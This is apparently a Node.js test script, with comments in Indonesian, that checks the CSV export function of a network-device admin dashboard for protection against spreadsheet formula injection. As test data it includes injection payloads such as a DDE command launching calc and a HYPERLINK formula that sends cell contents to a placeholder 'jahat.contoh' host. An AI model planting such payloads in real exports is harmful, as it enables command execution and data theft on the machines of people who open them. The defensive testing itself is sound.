#!/usr/bin/env node
/* Uji ekspor CSV (downloadCSV di frontend/js/main.js) — 2026-10-04.
 *
 * Ekspor Device, Dashboard dan Log dibuka administrator di Excel. Sel yang diawali
 * = + - @ dijalankan Excel sebagai RUMUS, dan isi ekspor banyak yang datang dari luar:
 * nama WiFi yang diganti pelanggan lewat portal, hostname perangkat di rumahnya, nilai
 * apa pun yang dilaporkan ONU. Tanpa penetral, pelanggan cukup menamai WiFi-nya
 * `=HYPERLINK(...)` untuk menaruh rumus di komputer administrator.
 *
 * Yang dijaga:
 *   1. sel berbahaya diberi tanda petik di depan (dibaca sebagai teks);
 *   2. angka biasa — termasuk RX negatif — TIDAK diubah (tetap bisa diurutkan/dijumlah);
 *   3. aturan RFC 4180 (kutip ganda, titik koma, baris baru) tetap berlaku sesudahnya.
 *
 * Fungsinya dijalankan SUNGGUHAN (diambil dari main.js), bukan dicocokkan sebagai teks.
 */
'use strict';
const fs = require('fs');
const path = require('path');
const vm = require('vm');

const main = fs.readFileSync(path.join(__dirname, '..', 'frontend', 'js', 'main.js'), 'utf8');
let pass = 0, fail = 0;
const ok = (c, m) => { if (c) pass++; else { fail++; console.log('  ✗ ' + m); } };

const awal = main.indexOf('function downloadCSV(');
const akhir = main.indexOf('\n}\n', awal);
ok(awal > 0 && akhir > awal, 'downloadCSV ditemukan di main.js');

// Kotak pasir: Blob/URL/document tiruan yang menangkap isi berkas.
let isi = null;
const kotak = {
  Blob: function (bagian) { isi = bagian.join(''); },
  URL: { createObjectURL: () => 'blob:uji', revokeObjectURL: () => {} },
  document: { createElement: () => ({ click() {}, remove() {} }), body: { appendChild() {} } },
  setTimeout: () => 0,
};
vm.runInNewContext(main.slice(awal, akhir + 2) + '\nthis.downloadCSV = downloadCSV;', kotak);
const csv = rows => { isi = null; kotak.downloadCSV('uji.csv', rows); return isi.replace(/^﻿/, ''); };
const sel = v => csv([[v]]);

// ── 1. Sel berbahaya dinetralkan ──
for (const jahat of ['=cmd|\' /C calc\'!A0', '=HYPERLINK("http://jahat.contoh/?"&A1,"klik")', '+SUM(1,2)',
                     '-2+3+cmd|\' /C calc\'!A0', '@SUM(A1:A9)', '\t=1+1', '\r=1+1', '=1+1']) {
  const h = sel(jahat);
  ok(/^"?'/.test(h), 'sel berbahaya diberi tanda petik di depan: ' + JSON.stringify(jahat) + ' → ' + JSON.stringify(h));
}
ok(sel('=HYPERLINK("a";"b")') === '"\'=HYPERLINK(""a"";""b"")"', 'penetral + RFC 4180 bersama-sama: kutip ganda digandakan, sel dibungkus');
ok(csv([['SSID', '=1+1'], ['x', '@y']]) === "SSID;'=1+1\r\nx;'@y", 'tiap sel diperiksa, pemisah ; dan baris CRLF');

// ── 2. Angka dan teks biasa tidak diubah ──
for (const [v, harap] of [[-18.42, '-18.42'], ['-18.42', '-18.42'], ['-26,10', '-26,10'], ['+62', '+62'], [0, '0'], [48, '48'],
                          ['RUMAH BUDI', 'RUMAH BUDI'], ['budi.contoh@sky', 'budi.contoh@sky'], ['ZTEGCONTOH0001', 'ZTEGCONTOH0001'],
                          ['10.99.1.25', '10.99.1.25'], ['100/170', '100/170'], ['—', '—'], [null, ''], [undefined, ''],
                          ['a=b', 'a=b'], ['WiFi-Rumah', 'WiFi-Rumah']]) {
  ok(sel(v) === harap, 'tidak diubah: ' + JSON.stringify(v) + ' → ' + JSON.stringify(sel(v)));
}
ok(sel('-18.42 dBm') === "'-18.42 dBm" && sel('-1+1') === "'-1+1", 'diawali minus tetapi BUKAN angka murni → dinetralkan');

// ── 3. RFC 4180 tetap berlaku ──
ok(sel('a;b') === '"a;b"' && sel('kata "kutip"') === '"kata ""kutip"""' && sel('dua\nbaris') === '"dua\nbaris"',
   'titik koma, kutip ganda dan baris baru dibungkus kutip');

// ── 4. Semua ekspor lewat satu pintu ──
const js = f => fs.readFileSync(path.join(__dirname, '..', 'frontend', 'js', f), 'utf8');
ok(['dashboard.js', 'devices.js', 'log.js'].every(f => /downloadCSV\(/.test(js(f))),
   'ekspor Dashboard, Device dan Log semuanya memakai downloadCSV (satu penetral untuk semua)');
ok(!/text\/csv|new Blob\(/.test(js('dashboard.js') + js('devices.js') + js('log.js') + js('settings.js')),
   'tidak ada halaman yang menyusun berkas CSV sendiri di luar downloadCSV');

console.log('csv: ' + pass + ' lulus, ' + fail + ' gagal');
process.exit(fail ? 1 : 0);
